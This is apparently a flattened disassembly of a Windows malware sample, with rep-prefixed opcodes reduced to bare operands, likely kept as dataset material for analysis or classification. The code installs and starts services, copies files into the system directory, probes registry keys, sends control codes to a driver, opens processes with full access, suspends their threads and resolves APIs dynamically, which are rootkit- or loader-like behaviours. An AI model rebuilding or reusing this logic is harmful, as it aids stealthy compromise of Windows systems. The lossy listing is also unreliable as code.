xor eax eax
lea edx [ esp + 0x114 ]
[ edi ]
not ecx
sub edi ecx
push 0x100
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x18 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ esp + 0x11c ]
push rw-data
push ecx
push 0x80000002
call sub_40eb00
lea edx [ esp + 0x28 ]
push rw-data
push edx
call sub_4066e3
add esp 0x24
test eax eax
jne r-xdata
push eax
call sub_406daf
push rw-data
push 0x0
mov ebx eax
call sub_4066e3
add esp 0xc
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
add esp 0x200
retn
push eax
call sub_406daf
push rw-data
push 0x0
mov edi eax
call sub_4066e3
add esp 0xc
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
add esp 0x200
retn
push eax
call sub_406daf
push rw-data
push 0x0
mov esi eax
call sub_4066e3
add esp 0xc
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
add esp 0x200
retn
push eax
call sub_406daf
add esp 0x4
inc eax
cmp eax 0x10000
jb r-xdata
pop edi
pop esi
pop ebx
add esp 0x200
retn
push eax
push esi
push edi
push ebx
lea eax [ esp + 0x1c ]
push rw-data
push eax
call [ wsprintfA@IAT ]
lea ecx [ esp + 0x24 ]
lea edx [ esp + 0x124 ]
push ecx
push rw-data
push edx
push 0x80000002
call sub_40eb70
add esp 0x28
mov eax 0x1
pop edi
pop esi
pop ebx
add esp 0x200
retn
inc esi
mov eax 0x1
cmp esi 0x10000
jb r-xdata
inc edi
mov esi eax
cmp edi 0x10000
jb r-xdata
mov edi eax
inc ebx
sub_40fb10
push ebx
push edi
push 0x48
call sub_406c98
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
mov ecx 0x12
xor eax eax
mov edi ebx
[ edi ]
call sub_40fd20
cmp ax 0x5
jl r-xdata
pop edi
pop ebx
retn
cmp ax 0x8
jl r-xdata
cmp ax 0x7
jg r-xdata
call sub_40fea0
test eax eax
je r-xdata
mov [ ebx ] 0x0
mov eax ebx
pop edi
pop ebx
retn
mov [ ebx ] 0x2
jmp r-xdata
call sub_40ff60
test eax eax
je r-xdata
mov [ ebx ] 0x0
mov eax ebx
pop edi
pop ebx
retn
mov edx [ esp + 0xc ]
test edx edx
je r-xdata
call sub_40ffc0
test eax eax
je r-xdata
mov [ ebx ] 0x0
mov eax ebx
pop edi
pop ebx
retn
mov eax [ ebx + 0x44 ]
test eax eax
jne r-xdata
mov edi edx
or ecx 0xffffffff
xor eax eax
push ebp
[ edi ]
not ecx
sub edi ecx
push esi
lea ebp [ ebx + 0x2 ]
mov eax ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ax [ ebx ]
pop esi
cmp ax 0x1
pop ebp
jne r-xdata
call sub_40ff00
neg eax
sbb eax eax
neg eax
inc eax
mov [ ebx ] ax
mov [ ebx ] 0x0
mov eax ebx
pop edi
pop ebx
retn
push eax
call sub_410020
add esp 0x4
mov eax ebx
pop edi
pop ebx
retn
push ebx
call sub_406c50
add esp 0x4
xor eax eax
pop edi
pop ebx
retn
cmp ax 0x2
jne r-xdata
mov ecx [ esp + 0x10 ]
push ecx
push edx
call sub_4105d0
jmp r-xdata
mov eax [ esp + 0x10 ]
push eax
push edx
call sub_410350
add esp 0x8
mov [ ebx + 0x44 ] eax
sub_40fc20
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push esi
call sub_406c50
add esp 0x4
call sub_410030
mov ax [ esi ]
cmp ax 0x1
jne r-xdata
cmp ax 0x2
jne r-xdata
mov ecx [ esi + 0x44 ]
lea eax [ esi + 0x2 ]
push eax
push ecx
call sub_4106c0
add esp 0x8
push esi
call sub_406c50
add esp 0x4
pop esi
retn
mov edx [ esi + 0x44 ]
push 0x0
push edx
call sub_410570
add esp 0x8
sub_40fc80
mov edx [ esp + 0x4 ]
sub esp 0x28
lea eax [ esp + 0x2c ]
lea ecx [ esp ]
push eax
push 0x28
push ecx
push edx
call sub_4107c0
mov eax [ esp + 0x3c ]
add esp 0x10
cmp eax 0x4
jae r-xdata
cmp eax 0x28
jbe r-xdata
xor eax eax
add esp 0x28
retn
shr eax 0x2
mov eax 0xa
jmp r-xdata
push eax
lea eax [ esp + 0x4 ]
push eax
call sub_4108b0
add esp 0x8
neg eax
sbb eax eax
neg eax
add esp 0x28
retn
sub_40fd20
sub esp 0x84
lea eax [ esp + 0x4 ]
push esi
push rw-data
push eax
call sub_40e8d0
mov esi [ RegOpenKeyExA@IAT ]
add esp 0x8
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0x8 ]
push ecx
push 0x20019
push 0x0
push edx
push 0x80000002
call esi
test eax eax
jne r-xdata
lea ecx [ esp + 0x8 ]
push rw-data
push ecx
call sub_40e8d0
add esp 0x8
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x8 ]
push edx
push 0x20019
push 0x0
push eax
push 0x80000002
call esi
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
push eax
call [ RegCloseKey@IAT ]
mov ax 0x5
pop esi
add esp 0x84
retn
lea edx [ esp + 0x8 ]
push rw-data
push edx
call sub_40e8d0
add esp 0x8
lea eax [ esp + 0x4 ]
lea ecx [ esp + 0x8 ]
push eax
push 0x20019
push 0x0
push ecx
push 0x80000002
call esi
test eax eax
jne r-xdata
mov ecx [ esp + 0x4 ]
push ecx
call [ RegCloseKey@IAT ]
mov ax 0x6
pop esi
add esp 0x84
retn
lea eax [ esp + 0x8 ]
push rw-data
push eax
call sub_40e8d0
add esp 0x8
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0x8 ]
push ecx
push 0x20019
push 0x0
push edx
push 0x80000002
call esi
test eax eax
jne r-xdata
mov edx [ esp + 0x4 ]
push edx
call [ RegCloseKey@IAT ]
mov ax 0x7
pop esi
add esp 0x84
retn
lea ecx [ esp + 0x8 ]
push rw-data
push ecx
call sub_40e8d0
add esp 0x8
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x8 ]
push edx
push 0x20019
push 0x0
push eax
push 0x80000002
call esi
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
push eax
call [ RegCloseKey@IAT ]
mov ax 0x8
pop esi
add esp 0x84
retn
xor ax ax
pop esi
add esp 0x84
retn
mov ecx [ esp + 0x4 ]
push ecx
call [ RegCloseKey@IAT ]
mov ax 0x64
pop esi
add esp 0x84
retn
sub_40fea0
sub esp 0x84
lea eax [ esp + 0x4 ]
push rw-data
push eax
call sub_40e8d0
add esp 0x8
lea ecx [ esp ]
lea edx [ esp + 0x4 ]
push ecx
push 0x20019
push 0x0
push edx
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
xor eax eax
add esp 0x84
retn
mov eax [ esp ]
push eax
call [ RegCloseKey@IAT ]
mov eax 0x1
add esp 0x84
retn
sub_40ff00
sub esp 0x84
lea eax [ esp + 0x4 ]
push rw-data
push eax
call sub_40e8d0
add esp 0x8
lea ecx [ esp ]
lea edx [ esp + 0x4 ]
push ecx
push 0x20019
push 0x0
push edx
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
xor eax eax
add esp 0x84
retn
mov eax [ esp ]
push eax
call [ RegCloseKey@IAT ]
mov eax 0x1
add esp 0x84
retn
sub_40ff60
sub esp 0x84
lea eax [ esp + 0x4 ]
push rw-data
push eax
call sub_40e8d0
add esp 0x8
lea ecx [ esp ]
lea edx [ esp + 0x4 ]
push ecx
push 0x20019
push 0x0
push edx
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
xor eax eax
add esp 0x84
retn
mov eax [ esp ]
push eax
call [ RegCloseKey@IAT ]
mov eax 0x1
add esp 0x84
retn
sub_40ffc0
sub esp 0x84
lea eax [ esp + 0x4 ]
push rw-data
push eax
call sub_40e8d0
add esp 0x8
lea ecx [ esp ]
lea edx [ esp + 0x4 ]
push ecx
push 0x20019
push 0x0
push edx
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
xor eax eax
add esp 0x84
retn
mov eax [ esp ]
push eax
call [ RegCloseKey@IAT ]
mov eax 0x1
add esp 0x84
retn
sub_410040
sub esp 0x20
push ebx
push ebp
push esi
push edi
push 0xf003f
push 0x0
push 0x0
call [ OpenSCManagerA@IAT ]
test eax eax
mov [ esp + 0x10 ] eax
jne r-xdata
mov ecx [ esp + 0x34 ]
push 0x0
mov edi [ esp + 0x3c ]
push 0x0
push 0x0
push 0x0
push 0x0
push ecx
push 0x1
push 0x3
push 0x1
push 0xf01ff
push edi
push edi
push eax
call [ CreateServiceA@IAT ]
mov ebx [ GetLastError@IAT ]
mov ebp [ SetLastError@IAT ]
mov esi eax
test esi esi
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn
push 0x0
push 0x0
push esi
call [ StartServiceA@IAT ]
test eax eax
jne r-xdata
call ebx
mov esi eax
push esi
call ebp
cmp esi 0x431
jne r-xdata
lea ecx [ esp + 0x14 ]
push ecx
push esi
call [ QueryServiceStatus@IAT ]
test eax eax
jne r-xdata
call ebx
mov edi eax
push edi
call ebp
cmp edi 0x420
je r-xdata
mov edx [ esp + 0x10 ]
push edx
call [ CloseServiceHandle@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x20
retn
push 0xf01ff
push edi
mov edi [ esp + 0x18 ]
push edi
call [ OpenServiceA@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov ebp [ GetTickCount@IAT ]
call ebp
mov edi [ esp + 0x28 ]
mov ebx eax
cmp [ esp + 0x18 ] 0x2
jne r-xdata
push esi
mov esi [ CloseServiceHandle@IAT ]
call esi
mov edx [ esp + 0x10 ]
push edx
call esi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x20
retn
mov eax [ esp + 0x10 ]
mov edi [ CloseServiceHandle@IAT ]
push eax
call edi
push esi
call edi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x20
retn
push edi
call [ CloseServiceHandle@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x20
retn
push esi
mov esi [ CloseServiceHandle@IAT ]
call esi
mov ecx [ esp + 0x10 ]
push ecx
call esi
mov ecx [ esp + 0x18 ]
xor eax eax
pop edi
cmp ecx 0x4
pop esi
pop ebp
sete al
pop ebx
add esp 0x20
retn
mov eax 0xcccccccd
mul [ esp + 0x2c ]
shr edx 0x3
cmp edx 0x3e8
jae r-xdata
cmp edx 0x2710
jbe r-xdata
mov edx 0x3e8
jmp r-xdata
push edx
call [ Sleep@IAT ]
lea eax [ esp + 0x14 ]
push eax
push esi
call [ QueryServiceStatus@IAT ]
test eax eax
je r-xdata
mov edx 0x2710
cmp [ esp + 0x28 ] edi
jbe r-xdata
call ebp
mov ecx [ esp + 0x2c ]
sub eax ebx
cmp eax ecx
ja r-xdata
call ebp
mov edi [ esp + 0x28 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x18 ] 0x2
je r-xdata
sub_4101f0
sub esp 0x1c
push esi
push edi
push 0xf003f
push 0x0
push 0x0
call [ OpenSCManagerA@IAT ]
mov edi eax
test edi edi
jne r-xdata
mov eax [ esp + 0x28 ]
push 0xf01ff
push eax
push edi
call [ OpenServiceA@IAT ]
mov esi eax
test esi esi
jne r-xdata
pop edi
pop esi
add esp 0x1c
retn
lea ecx [ esp + 0x8 ]
push ecx
push 0x1
push esi
call [ ControlService@IAT ]
push esi
call [ DeleteService@IAT ]
push esi
mov esi [ CloseServiceHandle@IAT ]
call esi
push edi
call esi
pop edi
mov eax 0x1
pop esi
add esp 0x1c
retn
push edi
call [ CloseServiceHandle@IAT ]
pop edi
xor eax eax
pop esi
add esp 0x1c
retn
sub_410270
push esi
push edi
push 0xf003f
push 0x0
push 0x0
call [ OpenSCManagerA@IAT ]
mov edi eax
test edi edi
jne r-xdata
mov eax [ esp + 0xc ]
push 0xf01ff
push eax
push edi
call [ OpenServiceA@IAT ]
mov esi eax
test esi esi
jne r-xdata
pop edi
pop esi
retn
push 0x0
push 0x0
push esi
call [ StartServiceA@IAT ]
test eax eax
push esi
mov esi [ CloseServiceHandle@IAT ]
jne r-xdata
push edi
call [ CloseServiceHandle@IAT ]
pop edi
xor eax eax
pop esi
retn
call esi
push edi
call esi
pop edi
mov eax 0x1
pop esi
retn
call esi
push edi
call esi
pop edi
xor eax eax
pop esi
retn
sub_4102e0
sub esp 0x1c
push esi
push edi
push 0xf003f
push 0x0
push 0x0
call [ OpenSCManagerA@IAT ]
mov edi eax
test edi edi
jne r-xdata
mov eax [ esp + 0x28 ]
push 0xf01ff
push eax
push edi
call [ OpenServiceA@IAT ]
mov esi eax
test esi esi
jne r-xdata
pop edi
pop esi
add esp 0x1c
retn
lea ecx [ esp + 0x8 ]
push ecx
push 0x1
push esi
call [ ControlService@IAT ]
push esi
mov esi [ CloseServiceHandle@IAT ]
call esi
push edi
call esi
pop edi
mov eax 0x1
pop esi
add esp 0x1c
retn
push edi
call [ CloseServiceHandle@IAT ]
pop edi
xor eax eax
pop esi
add esp 0x1c
retn
sub_410350
sub esp 0x3c0
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x2c0 ]
push ebx
push esi
push edi
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
push rw-data
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x2d0 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x3d4 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x10 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_40e8d0
add esp 0x8
mov ebx [ CreateFileA@IAT ]
lea ecx [ esp + 0x2cc ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x0
push 0xc0000000
push ecx
call ebx
cmp eax 0xffffffff
jne r-xdata
pop edi
pop esi
pop ebx
add esp 0x3c0
retn
push ebp
lea edx [ esp + 0x50 ]
push 0x80
push edx
call [ GetSystemDirectoryA@IAT ]
lea eax [ esp + 0x250 ]
push rw-data
push eax
call sub_40e8d0
or ecx 0xffffffff
lea edi [ esp + 0x258 ]
xor eax eax
lea edx [ esp + 0x58 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
or ecx 0xffffffff
mov edi edx
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea edx [ esp + 0x158 ]
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x58 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x158 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0x18 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_4102e0
add esp 0xc
test eax eax
pop ebp
je r-xdata
xor eax eax
mov esi [ CopyFileA@IAT ]
lea ecx [ esp + 0x14c ]
push 0x0
lea edx [ esp + 0x50 ]
push ecx
push edx
call esi
mov ecx [ esp + 0x3d4 ]
lea eax [ esp + 0x4c ]
push 0x0
push eax
push ecx
call esi
lea edx [ esp + 0xc ]
push edx
call sub_410270
add esp 0x4
lea ecx [ esp + 0x14c ]
test eax eax
lea eax [ esp + 0x4c ]
push 0x0
push eax
push ecx
jne r-xdata
call esi
lea edx [ esp + 0x14c ]
push edx
call [ DeleteFileA@IAT ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x0
lea eax [ esp + 0x2e0 ]
push 0xc0000000
push eax
call ebx
cmp eax 0xffffffff
jne r-xdata
call esi
lea edx [ esp + 0x14c ]
push edx
call [ DeleteFileA@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x3c0
retn
lea ecx [ esp + 0xc ]
push ecx
call sub_4102e0
lea edx [ esp + 0x10 ]
push edx
call sub_410270
add esp 0x8
sub_410570
mov eax [ esp + 0x4 ]
sub esp 0x80
test eax eax
je r-xdata
add esp 0x80
retn
push eax
call [ CloseHandle@IAT ]
lea eax [ esp ]
push rw-data
push eax
call sub_40e8d0
mov eax [ esp + 0x90 ]
add esp 0x8
test eax eax
je r-xdata
lea ecx [ esp ]
push ecx
push eax
jmp r-xdata
call sub_4102e0
add esp 0x4
lea edx [ esp ]
push edx
call sub_410270
add esp 0x4
sub_4105d0
sub esp 0x100
or ecx 0xffffffff
xor eax eax
lea edx [ esp ]
push ebx
push ebp
push esi
push edi
mov edi rw-data
mov ebx [ esp + 0x114 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x10 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
push eax
[ edi ] [ esi ]
mov edi ebx
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
push eax
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
push 0x3
and ecx 0x3
push eax
push eax
lea eax [ esp + 0x24 ]
[ edi ] [ esi ]
mov esi [ CreateFileA@IAT ]
push 0xc0000000
push eax
call esi
cmp eax 0xffffffff
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x100
retn
mov edi [ esp + 0x118 ]
push ebx
push edi
call sub_410040
add esp 0x8
test eax eax
jne r-xdata
push 0x0
push 0x0
push 0x3
push 0x0
push 0x0
lea ecx [ esp + 0x24 ]
push 0xc0000000
push ecx
call esi
cmp eax 0xffffffff
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x2
jne r-xdata
push ebx
call sub_4101f0
add esp 0x4
push ebx
call sub_4101f0
push ebx
push edi
call sub_410040
add esp 0xc
test eax eax
je r-xdata
xor eax eax
sub_4106e0
sub esp 0x30
push ebx
push esi
lea eax [ esp + 0x14 ]
push edi
push eax
call sub_410af0
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x28 ]
mov esi [ GetCurrentThreadId@IAT ]
mov [ esp + 0x30 ] ecx
mov ecx [ esp + 0x24 ]
add esp 0x4
mov [ esp + 0x30 ] edx
mov [ esp + 0x38 ] eax
mov [ esp + 0x34 ] ecx
call esi
mov edi [ esp + 0x40 ]
lea edx [ esp + 0xc ]
mov ebx [ DeviceIoControl@IAT ]
push 0x0
push edx
mov [ esp + 0x30 ] eax
push 0x0
push 0x0
lea eax [ esp + 0x38 ]
push 0x14
push eax
push 0x22e660
push edi
call ebx
mov [ esp + 0x14 ] 0x1
call esi
lea ecx [ esp + 0xc ]
push 0x0
push ecx
push 0x0
push 0x0
lea edx [ esp + 0x20 ]
push 0x8
push edx
push 0x22e65c
push edi
mov [ esp + 0x30 ] eax
call ebx
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x30
retn
sub_410780
sub esp 0xc
mov [ esp + 0x8 ] 0x0
call [ GetCurrentThreadId@IAT ]
mov edx [ esp + 0x10 ]
mov [ esp + 0x4 ] eax
lea eax [ esp ]
push 0x0
push eax
push 0x0
push 0x0
lea ecx [ esp + 0x14 ]
push 0x8
push ecx
push 0x22e65c
push edx
call [ DeviceIoControl@IAT ]
xor eax eax
add esp 0xc
retn
sub_4107c0
sub esp 0x128
push ebx
push esi
mov esi [ esp + 0x140 ]
push edi
xor eax eax
mov ecx 0x49
lea edi [ esp + 0x10 ]
mov [ esp + 0xc ] 0x0
push eax
push 0x2
[ edi ]
mov [ esi ] eax
call CreateToolhelp32Snapshot
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
lea eax [ esp + 0xc ]
push ebp
push eax
push ebx
mov [ esp + 0x18 ] 0x128
call Process32First
test eax eax
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x128
retn
push ebx
call [ CloseHandle@IAT ]
pop ebp
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x128
retn
mov eax [ esp + 0x13c ]
mov ebp [ esp + 0x144 ]
mov edi [ esp + 0x140 ]
test eax eax
jne r-xdata
mov eax [ esp + 0x13c ]
lea ecx [ esp + 0x34 ]
push eax
push ecx
call sub_412200
add esp 0x8
test eax eax
je r-xdata
cmp [ esi ] ebp
jae r-xdata
lea eax [ esp + 0x10 ]
push eax
push ebx
call Process32Next
test eax eax
jne r-xdata
cmp [ esi ] ebp
jae r-xdata
mov ecx [ esi ]
lea edx [ esp + 0x10 ]
add ecx 0x4
push edx
push ebx
mov [ esi ] ecx
call Process32Next
test eax eax
jne r-xdata
mov ecx [ esp + 0x18 ]
mov [ edi ] ecx
add edi 0x4
add [ esi ] 0x4
mov edx [ esp + 0x18 ]
mov [ edi ] edx
add edi 0x4
jmp r-xdata
sub_4108b0
sub esp 0x34
push ebp
push edi
call sub_410e00
mov edi eax
test edi edi
mov [ esp + 0x18 ] edi
jne r-xdata
push 0x1
push edi
call sub_410f00
lea eax [ esp + 0x1c ]
lea ecx [ esp + 0x14 ]
push eax
push 0x4
push ecx
push rw-data
call sub_4107c0
mov eax [ esp + 0x2c ]
add esp 0x18
cmp eax 0x4
jae r-xdata
pop edi
pop ebp
add esp 0x34
retn
mov edx [ esp + 0xc ]
push edx
push 0x0
push 0x1f0fff
call [ OpenProcess@IAT ]
mov ebp eax
test ebp ebp
jne r-xdata
pop edi
xor eax eax
pop ebp
add esp 0x34
retn
push esi
push 0x4
push 0x1000
push 0x64000
push 0x0
call [ VirtualAlloc@IAT ]
mov esi eax
lea eax [ esp + 0x20 ]
push eax
push 0x64000
push esi
push 0x10
call sub_410ca0
mov eax [ esi ]
test eax eax
jle r-xdata
pop edi
pop ebp
add esp 0x34
retn
push edi
call [ CloseHandle@IAT ]
pop esi
pop edi
mov eax 0x1
pop ebp
add esp 0x34
retn
push ebx
mov ebx [ GetCurrentProcess@IAT ]
lea edi [ esi + 0xa ]
mov esi [ esp + 0x4c ]
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x18 ]
add edi 0x10
dec eax
mov [ esp + 0x18 ] eax
jne r-xdata
cmp [ edi - 0x2 ] 0x6
jne r-xdata
mov ecx [ edi - 0x6 ]
mov eax [ esp + 0x14 ]
cmp ecx eax
jne r-xdata
mov edi [ esp + 0x20 ]
pop ebx
push 0x2
push 0x1
lea edx [ esp + 0x18 ]
push 0x0
push edx
call ebx
push eax
xor eax eax
mov ax [ edi ]
push eax
push ebp
call sub_410d80
mov edx [ esp + 0x10 ]
push 0x0
lea ecx [ esp + 0x2c ]
push 0x1c
push ecx
push 0x0
push edx
call sub_410d10
xor eax eax
test esi esi
jle r-xdata
mov ecx [ esp + 0x10 ]
push ecx
call [ CloseHandle@IAT ]
mov ecx [ esp + 0x48 ]
mov edx [ esp + 0x30 ]
mov eax [ esp + 0x10 ]
push eax
call [ SuspendThread@IAT ]
inc eax
add ecx 0x4
cmp eax esi
jl r-xdata
cmp edx [ ecx ]
je r-xdata
jmp r-xdata
sub_410a00
sub esp 0x20
push ebx
push ebp
mov ebp [ esp + 0x2c ]
push esi
push edi
push ebp
lea ecx [ esp + 0x24 ]
call sub_410f20
lea ecx [ esp + 0x20 ]
call sub_410f80
mov esi eax
push 0x5
lea ecx [ esp + 0x24 ]
mov [ esp + 0x1c ] esi
call sub_410f90
mov edi [ eax + 0x4 ]
mov eax [ eax ]
test eax eax
mov [ esp + 0x10 ] edi
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x20
retn
test [ esi + 0x16 ] 0x1
jne r-xdata
add eax ebp
test edi edi
mov [ esp + 0x14 ] eax
je r-xdata
mov ecx [ eax + 0x4 ]
xor ebx ebx
mov [ esp + 0x1c ] ecx
lea edx [ eax + 0x8 ]
lea esi [ ecx - 0x8 ]
shr esi 0x1
test esi esi
jle r-xdata
sub edi ecx
add eax ecx
test edi edi
mov [ esp + 0x10 ] edi
mov [ esp + 0x14 ] eax
jne r-xdata
mov edi [ eax ]
inc ebx
add edx 0x2
cmp ebx esi
jl r-xdata
mov ecx [ eax + ebp ]
mov ebp [ esp + 0x18 ]
sub ecx [ ebp + 0x34 ]
mov ebp [ esp + 0x38 ]
cmp ecx ebp
mov ebp [ esp + 0x34 ]
jne r-xdata
mov cx [ edx ]
mov eax ecx
and ecx 0xf000
and eax 0xfff
add eax edi
cmp ecx 0x3000
jne r-xdata
mov ecx [ esp + 0x1c ]
mov eax [ esp + 0x14 ]
mov edi [ esp + 0x10 ]
cmp [ eax + ebp - 0x2 ] 0x5c7
je r-xdata
mov edx [ esp + 0x18 ]
mov eax [ eax + ebp + 0x4 ]
pop edi
pop esi
mov ecx [ edx + 0x34 ]
pop ebp
sub eax ecx
pop ebx
add esp 0x20
retn
sub_410af0
sub esp 0x98
push ebx
lea eax [ esp + 0x8 ]
push esi
push eax
lea ecx [ esp + 0xc ]
push 0x4
push ecx
push 0xb
mov [ esp + 0x18 ] 0x0
call sub_410ca0
cmp eax 0xc0000004
jne r-xdata
pop esi
xor eax eax
pop ebx
add esp 0x98
retn
mov edx [ esp + 0xc ]
push edx
call sub_413474
mov ecx [ esp + 0x10 ]
add esp 0x4
mov [ esp + 0x8 ] eax
push 0x0
push ecx
push eax
push 0xb
call sub_410ca0
test eax eax
jl r-xdata
mov edx [ esp + 0x8 ]
push edx
call sub_41349d
add esp 0x4
mov eax [ esp + 0x8 ]
xor ecx ecx
push 0x1
push 0x0
mov cx [ eax + 0x1e ]
lea eax [ ecx + eax + 0x20 ]
push eax
call [ LoadLibraryExA@IAT ]
mov esi eax
test esi esi
je r-xdata
lea eax [ esp + 0x20 ]
push rw-data
push eax
call sub_40e8d0
add esp 0x8
lea ecx [ esp + 0x20 ]
push ecx
push esi
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
sub eax esi
push eax
push esi
call sub_410a00
mov ebx eax
add esp 0x8
test ebx ebx
jne r-xdata
push edi
push esi
lea ecx [ esp + 0x18 ]
call sub_410f20
lea ecx [ esp + 0x14 ]
call sub_410f80
mov edi [ eax + 0x34 ]
lea ecx [ esp + 0x14 ]
call sub_410f80
mov eax [ eax + 0x50 ]
add esi ebx
mov ecx esi
xor edx edx
mov ebx [ ecx ]
sub ebx edi
cmp ebx eax
jae r-xdata
mov eax [ esp + 0x8 ]
push eax
call sub_41349d
add esp 0x4
xor eax eax
pop esi
pop ebx
add esp 0x98
retn
mov eax [ esp + 0xa8 ]
mov ecx [ esp + 0xc ]
mov [ eax + 0x8 ] esi
mov [ eax ] edi
mov ecx [ ecx + 0xc ]
pop edi
mov [ eax + 0x4 ] ecx
mov [ eax + 0xc ] edx
pop esi
xor eax eax
pop ebx
add esp 0x98
retn
mov ebx [ ecx + 0x4 ]
add ecx 0x4
sub ebx edi
inc edx
cmp ebx eax
jb r-xdata
sub_410c40
sub esp 0x80
lea eax [ esp ]
push rw-data
push eax
call sub_40e8d0
add esp 0x8
lea ecx [ esp ]
push ecx
call [ GetModuleHandleA@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x84 ]
push ecx
push eax
call [ GetProcAddress@IAT ]
add esp 0x80
retn
lea edx [ esp ]
push edx
call [ LoadLibraryA@IAT ]
test eax eax
jne r-xdata
add esp 0x80
retn
sub_410ca0
mov eax [ rw-data ]
sub esp 0x80
test eax eax
jne r-xdata
mov edx [ esp + 0x90 ]
mov ecx [ esp + 0x8c ]
push edx
mov edx [ esp + 0x8c ]
push ecx
mov ecx [ esp + 0x8c ]
push edx
push ecx
call eax
add esp 0x80
retn 0x10
lea eax [ esp ]
push rw-data
push eax
call sub_40e8d0
lea ecx [ esp + 0x8 ]
push ecx
call sub_410c40
add esp 0xc
mov [ rw-data ] eax
test eax eax
jne r-xdata
add esp 0x80
retn 0x10
sub_410d10
mov eax [ rw-data ]
sub esp 0x80
test eax eax
jne r-xdata
mov edx [ esp + 0x94 ]
mov ecx [ esp + 0x90 ]
push edx
mov edx [ esp + 0x90 ]
push ecx
mov ecx [ esp + 0x90 ]
push edx
mov edx [ esp + 0x90 ]
push ecx
push edx
call eax
add esp 0x80
retn 0x14
lea eax [ esp ]
push rw-data
push eax
call sub_40e8d0
lea ecx [ esp + 0x8 ]
push ecx
call sub_410c40
add esp 0xc
mov [ rw-data ] eax
test eax eax
jne r-xdata
add esp 0x80
retn 0x14
sub_410d80
mov eax [ rw-data ]
sub esp 0x80
test eax eax
jne r-xdata
mov edx [ esp + 0x9c ]
mov ecx [ esp + 0x98 ]
push edx
mov edx [ esp + 0x98 ]
push ecx
mov ecx [ esp + 0x98 ]
push edx
mov edx [ esp + 0x98 ]
push ecx
mov ecx [ esp + 0x98 ]
push edx
mov edx [ esp + 0x98 ]
push ecx
push edx
call eax
add esp 0x80
retn 0x1c
lea eax [ esp ]
push rw-data
push eax
call sub_40e8d0
lea ecx [ esp + 0x8 ]
push ecx
call sub_410c40
add esp 0xc
mov [ rw-data ] eax
test eax eax
